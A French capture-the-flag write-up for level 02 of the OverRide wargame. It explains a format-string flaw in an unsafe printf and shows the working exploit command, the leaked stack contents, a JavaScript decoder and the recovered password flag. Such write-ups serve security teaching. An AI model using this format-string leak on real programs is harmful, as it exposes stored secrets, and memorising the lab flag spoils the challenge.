# Level 02

Nous remarquons l'utilisation d'un printf non sécurisé dans le programme.
Notre première entrée est utilisée en tant que string de formattage.

Nous utilisons le flag %p pour sonder la stack et obtenir le pass stocker dans le buffer de lecture du fichier. 26 %p suffisent à afficher l'entiereté du pass.

```bash
level02@OverRide:~$ python -c 'print "%p" * 27' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe3d0(nil)(nil)0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe5c80x1f7ff9a08(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil) does not have access!
```

Nous convertissons la chaine de caractère d'adresses hexadécimales avec un script et obtenons le flag suivant: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

Script utilisé:
```js
let raw = "0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d";

let result =
    raw
    .replace(/0x/g, '') // enlever les 0x au début des adresses
    .match(/.{1,16}/g) // grouper par addresses de 16 caractères hexadécimaux
    .map(address => 
        address
        .match(/.{1,2}/g) // grouper par 2 caractères
        .reverse() // reverse les octets de l'addresse à cause du little endian
        .map(hex => parseInt(hex, 16)) // parser les 2 caractères hexadécimaux
    )
    .flat();

let pass = String.fromCharCode(...result) // convertir en string
```